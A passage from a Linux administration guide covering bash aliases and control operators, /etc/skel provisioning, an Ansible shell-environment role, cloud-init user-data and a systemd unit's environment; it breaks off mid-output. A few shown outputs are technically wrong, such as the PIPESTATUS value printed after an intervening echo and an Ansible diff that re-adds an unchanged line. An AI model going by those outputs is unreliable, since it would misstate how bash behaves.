| Discoverable (`man`, `--help`, packaging) | ✗ | ✗ | ✓ |
| Correct use | Interactive typing shortcuts, safety flags | Shell-state mutation, per-session helpers | **Anything a machine invokes** |

**Decision rule:** if a non-human will ever invoke it, it is a script. Aliases are keystroke savings for a human; functions exist because a child process cannot change the parent's directory or environment.

Alias mechanics worth knowing for the exam and for real breakage:

```bash
$ alias ll='ls -lh --color=auto'
$ alias
alias ll='ls -lh --color=auto'
alias ls='ls --color=auto'

$ alias sudo='sudo '            # trailing space -> next word IS alias-expanded
$ alias k=kubectl
$ sudo k get nodes              # works only because of that trailing space

$ unalias ll
$ unalias -a                    # remove every alias

$ cat > /tmp/t.sh <<'EOF'
alias hi='echo hello'
hi
EOF
$ bash /tmp/t.sh
/tmp/t.sh: line 2: hi: command not found
```

That last output is the canonical alias trap: **aliases are expanded when a line is read, not when it is executed**, and they are disabled in non-interactive shells. Inside a script, `alias` + immediate use never works. Use a function.

### 5.5 Lists and control operators

A *list* is a sequence of pipelines separated by `;`, `&`, `&&` or `||`, optionally terminated by `;`, `&` or a newline.

| Operator | Semantics | Exit status of the list |
|---|---|---|
| `A ; B` | Sequential, unconditional | status of `B` |
| `A & B` | `A` asynchronous in a subshell, `B` immediately | `0` for `A &`; `$!` holds its PID |
| `A && B` | Run `B` only if `A` returned `0` | `B`'s if it ran, else `A`'s |
| `A \|\| B` | Run `B` only if `A` returned non-zero | `B`'s if it ran, else `A`'s |
| `A \| B` | Pipeline; both start concurrently | `B`'s, unless `set -o pipefail` |
| `( A )` | Subshell: isolated environment and CWD | `A`'s |
| `{ A ; }` | Group in the **current** shell; needs the trailing `;` | `A`'s |
| `! A` | Negate | logical NOT of `A`'s |

Precedence: `&&` and `||` have **equal** precedence and associate left to right. The consequence bites people:

```bash
$ true  && echo "OK" || echo "FAIL"
OK
$ false && echo "OK" || echo "FAIL"
FAIL
$ true  && false      || echo "FAIL"
FAIL                                    # the "ternary" is not a ternary
```

`a && b || c` is **not** if/else: if `b` fails, `c` runs anyway. Use `if` when correctness matters.

Pipeline status handling — mandatory in any script that pipes:

```bash
$ set -o pipefail
$ false | true ; echo "pipefail status: $?"
pipefail status: 1
$ set +o pipefail
$ false | true ; echo "default status:  $?"
default status:  0

$ curl -fsS https://bad.example/x | gzip -dc > /tmp/out ; echo "$?"
0
$ echo "${PIPESTATUS[@]}"
6 1
```

This is precisely the failure mode CLAUDE.md warns about for `tee`: **the exit status of a pipeline is the exit status of its last command**. `generate | tee log` reports success while `generate` died.

### 5.6 The library pattern: shared shell code that survives review

```bash
$ sudo install -d -m 0755 /usr/local/lib/platform
$ sudo tee /usr/local/lib/platform/sre.sh >/dev/null <<'EOF'
# shellcheck shell=bash
# Platform SRE shell library. Sourced by /etc/profile.d/50-platform-lib.sh.
# Contract: defines only functions prefixed p_ or documented below. No side effects.

p_ctx() { kubectl config current-context 2>/dev/null || echo "-"; }

p_top() {
    local ns="${1:-$(kubectl config view --minify -o jsonpath='{..namespace}')}"
    kubectl top pod -n "${ns:-default}" --sort-by=memory 2>/dev/null \
        || printf 'p_top: metrics-server unavailable in %s\n' "${ns:-default}" >&2
}

p_env_diff() {
    # Compare the environment of two contexts. Usage: p_env_diff 'ssh h env' 'ssh h bash -lc env'
    diff --unified=0 <(eval "$1" | sort) <(eval "$2" | sort) || true
}
EOF
$ sudo chmod 0644 /usr/local/lib/platform/sre.sh
$ bash -n /usr/local/lib/platform/sre.sh && echo "syntax OK"
syntax OK
$ shellcheck -s bash /usr/local/lib/platform/sre.sh && echo "shellcheck clean"
shellcheck clean
```

Loader — POSIX, guarded, idempotent:

```sh
$ sudo tee /etc/profile.d/50-platform-lib.sh >/dev/null <<'EOF'
# Load the platform shell library for interactive bash sessions only.
# POSIX sh compatible: /etc/profile is also read by dash on Debian.
case "$-" in
    *i*) ;;
    *)   return 0 2>/dev/null || exit 0 ;;
esac
[ -n "${BASH_VERSION-}" ] || return 0
[ -r /usr/local/lib/platform/sre.sh ] || return 0
[ -n "${PLATFORM_LIB_LOADED-}" ] && return 0
PLATFORM_LIB_LOADED=1
. /usr/local/lib/platform/sre.sh
EOF
```

---

## 6. `/etc/skel` and account provisioning

### 6.1 Mechanics

`/etc/skel` is a template directory. `useradd -m` copies its contents (recursively, including dotfiles and subdirectories) into the new home directory, then `chown`s the result to the new user and group. Permissions of the copied files are preserved from the skeleton; the *home directory itself* is created with `HOME_MODE` (or `0777 & ~UMASK`) from `/etc/login.defs`.

```bash
$ grep -vE '^\s*#|^\s*$' /etc/default/useradd
GROUP=100
HOME=/home
INACTIVE=-1
EXPIRE=
SHELL=/bin/bash
SKEL=/etc/skel
CREATE_MAIL_SPOOL=yes

$ grep -E '^(UMASK|HOME_MODE|CREATE_HOME|USERGROUPS_ENAB)' /etc/login.defs
UMASK		022
HOME_MODE	0700
USERGROUPS_ENAB yes

$ ls -la /etc/skel
total 24
drwxr-xr-x   2 root root 4096 Aug 20 09:12 .
drwxr-xr-x 142 root root 12288 Aug 26 08:03 ..
-rw-r--r--   1 root root  220 Mar 31 08:41 .bash_logout
-rw-r--r--   1 root root 3771 Mar 31 08:41 .bashrc
-rw-r--r--   1 root root  807 Mar 31 08:41 .profile
```

Creation and verification:

```bash
$ sudo useradd -m -s /bin/bash -c 'Platform SRE' -G sudo,docker sre02
$ sudo ls -la /home/sre02
total 24
drwx------ 2 sre02 sre02 4096 Aug 26 10:41 .
drwxr-xr-x 6 root  root  4096 Aug 26 10:41 ..
-rw-r--r-- 1 sre02 sre02  220 Aug 26 10:41 .bash_logout
-rw-r--r-- 1 sre02 sre02 3771 Aug 26 10:41 .bashrc
-rw-r--r-- 1 sre02 sre02  807 Aug 26 10:41 .profile

$ getent passwd sre02
sre02:x:1002:1002:Platform SRE:/home/sre02:/bin/bash

# Use a non-default skeleton for a role account
$ sudo useradd -m -k /etc/skel.svc -s /usr/sbin/nologin -d /srv/exporter svc-exporter
$ sudo ls -A /srv/exporter
.profile
```

Debian's higher-level `adduser` reads its own configuration and can filter which skeleton files are copied:

```bash
$ grep -E '^(SKEL|SKEL_IGNORE_REGEX|DIR_MODE|DHOME|DSHELL)' /etc/adduser.conf
DSHELL=/bin/bash
DHOME=/home
SKEL=/etc/skel
SKEL_IGNORE_REGEX="dpkg-(old|new|dist|save)"
DIR_MODE=0700
```

### 6.2 Provisioning-path comparison

| Path | Consumes `/etc/skel` | When home is created | Typical use |
|---|:---:|---|---|
| `useradd -m` | ✅ (`SKEL=` in `/etc/default/useradd`, override with `-k`) | At account creation | Scripted provisioning, Ansible `user` module |
| `useradd -M` | ❌ | Never | Service accounts with a pre-existing `/srv` path |
| `adduser` (Debian, Perl) | ✅ (`SKEL` in `adduser.conf`, `SKEL_IGNORE_REGEX`) | At account creation | Interactive admin |
| `pam_mkhomedir.so` | ✅ (`skel=` option) | **At first login** | LDAP / SSSD / AD users with no local account |
| `oddjob-mkhomedir` (RHEL) | ✅ | At first login, via D-Bus, SELinux-aware | RHEL with SELinux enforcing |
| `systemd-homed` (`homectl`) | ❌ | At creation, from its own template | Portable/encrypted home areas |
| Cloud-init `users:` | ✅ (calls `useradd -m`) | First boot | Immutable images |

`pam_mkhomedir` for directory-backed identities:

```bash
$ sudo grep -rn mkhomedir /etc/pam.d/common-session
/etc/pam.d/common-session:26:session optional pam_mkhomedir.so skel=/etc/skel umask=0077

# RHEL / Fedora — do not hand-edit the PAM stack, use authselect
$ sudo authselect enable-feature with-mkhomedir
$ sudo systemctl enable --now oddjobd
$ sudo authselect current
Profile ID: sssd
Enabled features:
- with-mkhomedir
```

Verification that it actually fired:

```bash
$ ssh ldapuser@node01 'ls -ld ~; ls -A ~'
Creating home directory for ldapuser.
drwx------ 2 ldapuser domain users 4096 Aug 26 10:55 /home/ldapuser
.bash_logout
.bashrc
.profile
```

### 6.3 The architectural failure: `/etc/skel` is not a configuration-management channel

`/etc/skel` has **no reconciliation loop**. It is read exactly once per account, at creation. Editing it changes nothing on any existing host account, and there is no command that re-applies it. This produces the archetype-3 incident from §1.1 and it is the single most important design point in this objective.

| Requirement | `/etc/skel` | `/etc/profile.d` + `/etc/bash.bashrc` |
|---|---|---|
| Applies to existing users | ❌ | ✅ |
| Applies to users created tomorrow | ✅ | ✅ |
| User can override locally | ✅ (it's their file) | ✅ (later in the chain) |
| Convergent / idempotent | ❌ one-shot | ✅ every login |
| Auditable ("what is the fleet running?") | ❌ N copies, N versions | ✅ one file, checksummed |
| Removable centrally | ❌ requires touching N homes | ✅ delete the drop-in |
| Correct content | Personal *seeds* the user is expected to edit | Platform *policy* |

**The rule:** platform behaviour goes in `/etc/profile.d/*.sh` and `/etc/bash.bashrc`, managed by configuration management. `/etc/skel` carries only the minimal starter files a user is invited to customise — and it must still be managed as code, so that new and existing hosts agree.

Reconciling drift when the rule was broken (measure before you change anything):

```bash
$ sudo bash -c '
for h in /home/*; do
  u=$(basename "$h")
  [ -f "$h/.bashrc" ] || { printf "%-12s MISSING\n" "$u"; continue; }
  if cmp -s "$h/.bashrc" /etc/skel/.bashrc; then
    printf "%-12s pristine\n" "$u"
  else
    printf "%-12s drifted (%s lines differ)\n" "$u" \
      "$(diff "$h/.bashrc" /etc/skel/.bashrc | grep -c "^[<>]")"
  fi
done'
alice        pristine
bob          drifted (14 lines differ)
carol        drifted (3 lines differ)
sre02        pristine
svc-exporter MISSING
```

Never overwrite a drifted `~/.bashrc` — it is user data. Ship the platform layer through `/etc/profile.d` and leave personal files alone.

### 6.4 A complete, production skeleton

`/etc/skel/.bash_profile` — the login-shell entry point:

```bash
# ~/.bash_profile — executed by bash(1) for LOGIN shells.
#
# Order of evaluation for a login shell:
#   /etc/profile -> /etc/profile.d/*.sh -> THIS FILE
# ~/.bashrc is NOT read automatically by a login shell; the hook below does it.
#
# Put EXPORTED variables here (inherited by children).
# Put aliases, prompt and shopt in ~/.bashrc (not inherited, re-created per shell).

# 1. Personal bin directory, prepended, idempotently.
case ":${PATH}:" in
    *":${HOME}/.local/bin:"*) ;;
    *) PATH="${HOME}/.local/bin${PATH:+:${PATH}}" ;;
esac
export PATH

# 2. Session-wide preferences.
export EDITOR="${EDITOR:-vim}"
export VISUAL="$EDITOR"
export PAGER="${PAGER:-less}"
export LESS="-R -F -X -i"

# 3. XDG base directories (freedesktop.org spec).
export XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
export XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
export XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"

# 4. THE HOOK: a login shell must source ~/.bashrc explicitly.
if [ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ]; then
    . "$HOME/.bashrc"
fi
```

`/etc/skel/.bashrc` — the interactive entry point:

```bash
# ~/.bashrc — executed by bash(1) for INTERACTIVE, NON-LOGIN shells,
# and also for non-interactive shells started by sshd (network-connection case).
#
# CRITICAL: this file MUST produce no output when non-interactive.
# scp/sftp/rsync speak a binary protocol over that same stream; any stray
# byte written here corrupts the transfer ("protocol error: unexpected tag").

# --- Guard: bail out immediately if not interactive. Keep this FIRST. ---
case $- in
    *i*) ;;
      *) return ;;
esac

# --- Global definitions (RHEL/Fedora ship these; Debian compiles SYS_BASHRC) ---
if [ -f /etc/bashrc ]; then
    . /etc/bashrc
fi

# --- History: an operator convenience, NOT an audit log. Use auditd for that. ---
HISTCONTROL=ignoreboth:erasedups   # skip leading-space cmds and duplicates
HISTSIZE=100000                    # in-memory entries
HISTFILESIZE=200000                # on-disk entries
HISTTIMEFORMAT='%F %T '            # timestamps in `history` output
HISTIGNORE='ls:ll:pwd:exit:clear:history'
shopt -s histappend                # append, never truncate, on shell exit
shopt -s cmdhist                   # multi-line commands as one history entry

# --- Shell behaviour ---
shopt -s checkwinsize              # update LINES/COLUMNS after each command
shopt -s globstar                  # ** matches across directories
shopt -s no_empty_cmd_completion   # do not scan PATH on an empty TAB
shopt -s checkhash                 # verify hashed paths still exist
set -o noclobber                   # `>` refuses to truncate; use `>|` to force

# --- Prompt --------------------------------------------------------------
# \[ \] mark non-printing sequences so readline computes the line width
# correctly; omitting them is what makes long command lines wrap wrongly.
if [ -x /usr/bin/tput ] && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    if [ "$(id -u)" -eq 0 ]; then
        PS1='\[\e[1;31m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]# '
    else
        PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
    fi
else
    PS1='\u@\h:\w\$ '
fi
PS2='> '
PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}:${FUNCNAME[0]:-main}: '

# Keep PROMPT_COMMAND cheap: it runs before EVERY prompt. No git, no network.
PROMPT_COMMAND='history -a'

# --- Aliases: interactive typing only. Scripts must never rely on these. ---
alias ls='ls --color=auto'
alias ll='ls -lah --color=auto'
alias grep='grep --color=auto'
alias df='df -hT'
alias free='free -h'
alias ip='ip -color=auto'
alias rm='rm -I --preserve-root'   # -I prompts once for >3 files; -i is noisy
alias cp='cp -i'
alias mv='mv -i'

# --- Functions: anything needing arguments or shell-state mutation ---------
mkcd() { mkdir -p -- "$1" && cd -- "$1" || return 1; }

up() {                              # up 3  ->  cd ../../..
    local n="${1:-1}" p=""
    while [ "$n" -gt 0 ]; do p="../$p"; n=$((n - 1)); done
    cd -- "${p:-.}" || return 1
}

extract() {
    [ -f "$1" ] || { printf 'extract: no such file: %s\n' "$1" >&2; return 1; }
    case "$1" in
        *.tar.bz2|*.tbz2) tar xjf "$1" ;;
        *.tar.gz|*.tgz)   tar xzf "$1" ;;
        *.tar.xz)         tar xJf "$1" ;;
        *.tar.zst)        tar --zstd -xf "$1" ;;
        *.tar)            tar xf  "$1" ;;
        *.gz)             gunzip  "$1" ;;
        *.bz2)            bunzip2 "$1" ;;
        *.zip)            unzip   "$1" ;;
        *)  printf 'extract: unsupported format: %s\n' "$1" >&2; return 2 ;;
    esac
}

# --- Completion (guarded: absent in minimal images) -----------------------
if ! shopt -oq posix; then
    if [ -f /usr/share/bash-completion/bash_completion ]; then
        . /usr/share/bash-completion/bash_completion
    elif [ -f /etc/bash_completion ]; then
        . /etc/bash_completion
    fi
fi

# --- Local, unmanaged overrides. Keep this LAST. --------------------------
[ -f "$HOME/.bashrc.local" ] && . "$HOME/.bashrc.local"
```

`/etc/skel/.bash_logout`:

```bash
# ~/.bash_logout — executed when an INTERACTIVE LOGIN shell exits.
# Not executed for `ssh host cmd`, cron, systemd, or non-login shells:
# never rely on it for anything that must happen.

# Flush in-memory history now rather than losing it on an abrupt disconnect.
history -a 2>/dev/null

# Clear the console on a physical/virtual terminal so the next user
# cannot scroll back through the previous session.
case "$(tty)" in
    /dev/tty[0-9]*) [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q ;;
esac
```

`/etc/skel/.profile` — for users whose shell is not bash (`dash`, `sh`), and as the fallback when `~/.bash_profile` is absent:

```sh
# ~/.profile — POSIX sh. Read by login shells when ~/.bash_profile and
# ~/.bash_login do not exist. Must contain NO bashisms: it is also read by dash.

case ":${PATH}:" in
    *":$HOME/.local/bin:"*) ;;
    *) PATH="$HOME/.local/bin${PATH:+:$PATH}" ;;
esac
export PATH

EDITOR=vi; export EDITOR
PAGER=less; export PAGER

# If this login shell happens to be bash, hand off to ~/.bashrc.
if [ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ]; then
    . "$HOME/.bashrc"
fi
```

---

## 7. Infrastructure manifests

### 7.1 Ansible role — the reconciliation loop for the whole layer

`roles/shell_environment/defaults/main.yml`:

```yaml
---
# roles/shell_environment/defaults/main.yml
shell_env_toolchain_dir: /opt/toolchain/bin
shell_env_lib_dir: /usr/local/lib/platform
shell_env_idle_timeout: 900          # seconds; 0 disables (CIS 5.4.5 style control)
shell_env_locale: en_US.UTF-8
shell_env_umask: "0027"

shell_env_exports:
  PLATFORM_REGION: eu-central-1
  PLATFORM_ENV: production
  KUBE_EDITOR: "vim"
  DOCKER_BUILDKIT: "1"

shell_env_no_proxy: "localhost,127.0.0.1,::1,.svc,.cluster.local,10.0.0.0/8,169.254.169.254"
shell_env_https_proxy: "http://proxy.corp.internal:3128"

shell_env_skel_files:
  - .bash_profile
  - .bashrc
  - .bash_logout
  - .profile

shell_env_manage_secure_path: true
shell_env_secure_path: >-
  /opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

`roles/shell_environment/tasks/main.yml`:

```yaml
---
# roles/shell_environment/tasks/main.yml
- name: Assert supported platform
  ansible.builtin.assert:
    that:
      - ansible_facts['os_family'] in ['Debian', 'RedHat', 'Suse']
    fail_msg: >-
      shell_environment supports Debian, RedHat and Suse families only;
      got {{ ansible_facts['os_family'] }}
    quiet: true

- name: Ensure the platform library directory exists
  ansible.builtin.file:
    path: "{{ shell_env_lib_dir }}"
    state: directory
    owner: root
    group: root
    mode: "0755"

- name: Deploy the platform shell library
  ansible.builtin.copy:
    src: sre.sh
    dest: "{{ shell_env_lib_dir }}/sre.sh"
    owner: root
    group: root
    mode: "0644"
    validate: "bash -n %s"

# --- Layer 1: pam_env -- reaches cron and every non-shell PAM session -------
- name: Manage /etc/environment entries (pam_env, not a shell script)
  ansible.builtin.lineinfile:
    path: /etc/environment
    regexp: "^{{ item.key }}="
    line: '{{ item.key }}="{{ item.value }}"'
    owner: root
    group: root
    mode: "0644"
    create: true
  loop:
    - { key: LANG,        value: "{{ shell_env_locale }}" }
    - { key: HTTPS_PROXY, value: "{{ shell_env_https_proxy }}" }
    - { key: https_proxy, value: "{{ shell_env_https_proxy }}" }
    - { key: NO_PROXY,    value: "{{ shell_env_no_proxy }}" }
    - { key: no_proxy,    value: "{{ shell_env_no_proxy }}" }
  loop_control:
    label: "{{ item.key }}"

# --- Layer 2: /etc/profile.d -- login shells, exported, POSIX sh ------------
- name: Deploy the platform PATH drop-in
  ansible.builtin.template:
    src: 10-platform-path.sh.j2
    dest: /etc/profile.d/10-platform-path.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"        # POSIX check: this file is also read by dash

- name: Deploy the platform exports drop-in
  ansible.builtin.template:
    src: 20-platform-exports.sh.j2
    dest: /etc/profile.d/20-platform-exports.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"

- name: Deploy the library loader drop-in
  ansible.builtin.copy:
    src: 50-platform-lib.sh
    dest: /etc/profile.d/50-platform-lib.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"

# --- Layer 3: interactive policy -------------------------------------------
- name: Deploy the interactive shell policy drop-in
  ansible.builtin.template:
    src: 90-platform-interactive.sh.j2
    dest: /etc/profile.d/90-platform-interactive.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"

# --- Layer 4: skeleton for FUTURE accounts only -----------------------------
- name: Deploy skeleton files for newly created accounts
  ansible.builtin.copy:
    src: "skel/{{ item }}"
    dest: "/etc/skel/{{ item }}"
    owner: root
    group: root
    mode: "0644"
    validate: "bash -n %s"
  loop: "{{ shell_env_skel_files }}"

- name: Pin the skeleton directory used by useradd
  ansible.builtin.lineinfile:
    path: /etc/default/useradd
    regexp: '^SKEL='
    line: 'SKEL=/etc/skel'
    owner: root
    group: root
    mode: "0644"
  when: ansible_facts['os_family'] in ['RedHat', 'Suse']

- name: Enforce a private home directory mode for new accounts
  ansible.builtin.lineinfile:
    path: /etc/login.defs
    regexp: '^#?\s*HOME_MODE\b'
    line: "HOME_MODE\t0700"
    owner: root
    group: root
    mode: "0644"

# --- Layer 5: privileged PATH ----------------------------------------------
- name: Manage the sudo secure_path drop-in
  ansible.builtin.copy:
    dest: /etc/sudoers.d/20-platform-path
    content: |
      # Managed by Ansible role shell_environment. Do not edit.
      Defaults    secure_path="{{ shell_env_secure_path }}"
    owner: root
    group: root
    mode: "0440"
    validate: "visudo -cf %s"    # a bad sudoers file locks you out of root
  when: shell_env_manage_secure_path | bool

# --- Verification: the role proves its own effect ---------------------------
- name: Verify a login shell resolves the toolchain
  ansible.builtin.command:
    argv: [/bin/bash, -lc, 'command -v platformctl']
  register: shell_env_probe
  changed_when: false
  failed_when: shell_env_probe.rc != 0

- name: Verify /etc/profile.d contains no bashisms
  ansible.builtin.command:
    argv: [/bin/sh, -n, "/etc/profile.d/{{ item }}"]
  loop:
    - 10-platform-path.sh
    - 20-platform-exports.sh
    - 50-platform-lib.sh
    - 90-platform-interactive.sh
  changed_when: false

- name: Verify ~/.bashrc emits nothing on a non-interactive SSH-style invocation
  ansible.builtin.shell:
    cmd: |
      set -o pipefail
      out=$(HOME=/etc/skel bash --rcfile /etc/skel/.bashrc -c 'true' 2>&1)
      if [ -n "$out" ]; then
          printf 'bashrc produced output when non-interactive: %s\n' "$out" >&2
          exit 1
      fi
    executable: /bin/bash
  changed_when: false
```

`roles/shell_environment/templates/10-platform-path.sh.j2`:

```sh
# {{ ansible_managed }}
# /etc/profile.d/10-platform-path.sh
# POSIX sh ONLY: on Debian-family systems /etc/profile is also read by dash.

path_prepend() {
    [ -d "$1" ] || return 0
    case ":${PATH}:" in
        *":$1:"*) return 0 ;;
    esac
    PATH="$1${PATH:+:$PATH}"
}

path_append() {
    [ -d "$1" ] || return 0
    case ":${PATH}:" in
        *":$1:"*) return 0 ;;
    esac
    PATH="${PATH:+$PATH:}$1"
}

path_prepend "{{ shell_env_toolchain_dir }}"
path_append  "/opt/platform/sbin"

# A privileged shell also gets the sbin directories.
if [ "$(id -u)" -eq 0 ]; then
    path_append "/usr/local/sbin"
    path_append "/usr/sbin"
    path_append "/sbin"
fi

export PATH
unset -f path_prepend path_append
```

`roles/shell_environment/templates/20-platform-exports.sh.j2`:

```sh
# {{ ansible_managed }}
# /etc/profile.d/20-platform-exports.sh
{% for k, v in shell_env_exports.items() %}
{{ k }}="{{ v }}"; export {{ k }}
{% endfor %}

# Deterministic collation for anything a script parses.
# Humans keep their locale via /etc/environment; scripts override with LC_ALL=C.
LC_COLLATE=C; export LC_COLLATE
```

`roles/shell_environment/templates/90-platform-interactive.sh.j2`:

```sh
# {{ ansible_managed }}
# /etc/profile.d/90-platform-interactive.sh
# Interactive-only policy. Guard first, so scp/rsync streams stay clean.
case "$-" in
    *i*) ;;
    *)   return 0 2>/dev/null || exit 0 ;;
esac

umask {{ shell_env_umask }}

{% if shell_env_idle_timeout | int > 0 %}
# Idle-session timeout. readonly makes it a policy speed bump, not a control:
# a determined user can still `exec bash --norc`. Pair with sshd ClientAliveInterval.
TMOUT={{ shell_env_idle_timeout }}
readonly TMOUT
export TMOUT
{% endif %}

# Motd-style context marker: which cluster is this shell pointed at?
if [ -n "${BASH_VERSION-}" ] && [ -r /etc/platform/context ]; then
    printf '\033[1;33m[%s]\033[0m %s\n' \
        "$(cat /etc/platform/context)" "$(uname -srm)"
fi
```

Run it and read the output critically:

```bash
$ ansible-playbook -i inventories/prod site.yml --tags shell_env --check --diff
...
TASK [shell_environment : Deploy the platform PATH drop-in] *********************
--- before: /etc/profile.d/10-platform-path.sh
+++ after: /etc/profile.d/10-platform-path.sh
@@ -14,7 +14,7 @@
-path_prepend "/opt/toolchain/bin"
+path_prepend "/opt/toolchain/bin"
+path_append  "/opt/platform/sbin"
changed: [node01]

TASK [shell_environment : Verify a login shell resolves the toolchain] **********
ok: [node01]

PLAY RECAP *********************************************************************
node01  : ok=15  changed=1  unreachable=0  failed=0  skipped=1  rescued=0  ignored=0
```

### 7.2 cloud-init — first-boot provisioning of an immutable image

```yaml
#cloud-config
# /var/lib/cloud/seed/nocloud/user-data
hostname: node-{{ ds.meta_data.instance_id }}
manage_etc_hosts: true
locale: en_US.UTF-8
timezone: UTC

users:
  - name: sre
    gecos: Platform SRE
    primary_group: sre
    groups: [sudo, adm, systemd-journal]
    shell: /bin/bash
    sudo: "ALL=(ALL:ALL) NOPASSWD:ALL"
    lock_passwd: true
    ssh_authorized_keys:
      - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKp3n0Yq8QF1Wm2sJm5cQK9v0dQ2rC8t sre@bastion"

write_files:
  - path: /etc/environment
    owner: root:root
    permissions: "0644"
    content: |
      LANG=en_US.UTF-8
      PATH="/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
      NO_PROXY="localhost,127.0.0.1,::1,.svc,.cluster.local,10.0.0.0/8,169.254.169.254"

  - path: /etc/profile.d/10-platform-path.sh
    owner: root:root
    permissions: "0644"
    content: |
      # POSIX sh only: /etc/profile is read by dash on Debian.
      path_prepend() {
          [ -d "$1" ] || return 0
          case ":${PATH}:" in *":$1:"*) return 0 ;; esac
          PATH="$1${PATH:+:$PATH}"
      }
      path_prepend /opt/toolchain/bin
      export PATH
      unset -f path_prepend

  - path: /etc/profile.d/20-platform-exports.sh
    owner: root:root
    permissions: "0644"
    content: |
      PLATFORM_REGION=eu-central-1; export PLATFORM_REGION
      PLATFORM_ENV=production;      export PLATFORM_ENV
      KUBE_EDITOR=vim;              export KUBE_EDITOR

  # /etc/skel is written BEFORE cloud-init creates the users above,
  # because write_files runs at cc_write_files (init stage) and users are
  # created at cc_users_groups. New accounts therefore inherit these files.
  - path: /etc/skel/.bash_profile
    owner: root:root
    permissions: "0644"
    content: |
      case ":${PATH}:" in
          *":${HOME}/.local/bin:"*) ;;
          *) PATH="${HOME}/.local/bin${PATH:+:${PATH}}" ;;
      esac
      export PATH
      export EDITOR=vim VISUAL=vim PAGER=less
      [ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"

  - path: /etc/skel/.bashrc
    owner: root:root
    permissions: "0644"
    content: |
      case $- in *i*) ;; *) return ;; esac
      HISTCONTROL=ignoreboth:erasedups
      HISTSIZE=100000
      HISTFILESIZE=200000
      HISTTIMEFORMAT='%F %T '
      shopt -s histappend checkwinsize globstar checkhash
      PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
      PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}: '
      PROMPT_COMMAND='history -a'
      alias ls='ls --color=auto'
      alias ll='ls -lah --color=auto'
      alias grep='grep --color=auto'
      mkcd() { mkdir -p -- "$1" && cd -- "$1" || return 1; }

runcmd:
  # Prove the layer works on this boot; fail the instance loudly if not.
  - [ /bin/bash, -lc, 'command -v platformctl >/dev/null || { echo "FATAL: toolchain not on login PATH" >&2; exit 1; }' ]
  - [ /bin/sh, -n, /etc/profile.d/10-platform-path.sh ]
  - [ /bin/bash, -lc, 'printenv PATH | grep -q "^/opt/toolchain/bin:"' ]

final_message: "shell environment converged after $UPTIME seconds"
```

Verification after first boot:

```bash
$ cloud-init status --long
status: done
extended_status: done
boot_status_code: enabled-by-generator
last_update: Wed, 26 Aug 2026 10:12:44 +0000
detail: DataSourceNoCloud [seed=/var/lib/cloud/seed/nocloud]

$ sudo cloud-init schema --system --annotate
Valid schema /var/lib/cloud/instances/i-0a3f/cloud-config.txt

$ ssh sre@node01 'bash -lc "printenv PATH"'
/home/sre/.local/bin:/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### 7.3 `systemd` — the environment for things that never see a shell

`/etc/systemd/system/platform-exporter.service`:

```ini
[Unit]
Description=Platform metrics exporter
Documentation=https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html
After=network-online.target
Wants=network-online.target

[Service]
Type=notify
User=svc-exporter
Group=svc-exporter

# systemd does NOT execute a shell: /etc/profile, /etc/profile.d, ~/.bashrc,
# ~/.bash_profile and /etc/environment are ALL bypassed. Everything the
# process needs must be declared here.
Environment="PLATFORM_ENV=production"
Environment="PLATFORM_REGION=eu-central-1"
Environment="GOMAXPROCS=4"
Environment="PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# KEY=value only; parsed with allexport semantics, not executed as a script.
EnvironmentFile=-/etc/default/platform-exporter
EnvironmentFile=-/etc/platform/secrets.env

WorkingDirectory=/var/lib/platform-exporter
ExecStartPre=/usr/bin/env sh -c 'test -n "$PLATFORM_REGION" || { echo "PLATFORM_REGION unset" >&2; exit 78; }'
ExecStart=/opt/toolchain/bin/platform-exporter --listen=127.0.0.1:9101
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=5s

NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/platform-exporter
CapabilityBoundingSet=
SystemCallFilter=@system-service

[Install]
WantedBy=multi-user.target
```

`/etc/default/platform-exporter`:

```sh
# systemd EnvironmentFile: KEY=value, one per line.
# NOT a shell script: no `export`, no $(...), no conditionals.
# Quotes are stripped; a line without '=' is an error.
PLATFORM_SCRAPE_INTERVAL=30s
PLATFORM_LOG_LEVEL=info
PLATFORM_TENANT="acme-prod"
```

Verify what the unit actually received — never assume:

```bash
$ systemctl cat platform-exporter.service | head -5
# /etc/systemd/system/platform-exporter.service
[Unit]
Description=Platform metrics exporter

$ systemctl show platform-exporter.service --property=Environment
Environment=PLATFORM_ENV=production PLATFORM_REGION=eu-central-1 GOMAXPROCS=4 PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ systemctl show platform-exporter.service --property=EnvironmentFiles
EnvironmentFiles=/etc/default/platform-exporter (ignore_errors=yes) /etc/platform/secrets.env (ignore_errors=yes)

$ pid=$(systemctl show -p MainPID --value platform-exporter.service)
$ sudo tr '\0' '\n' < /proc/"$pid"/environ | sort
GOMAXPROCS=4
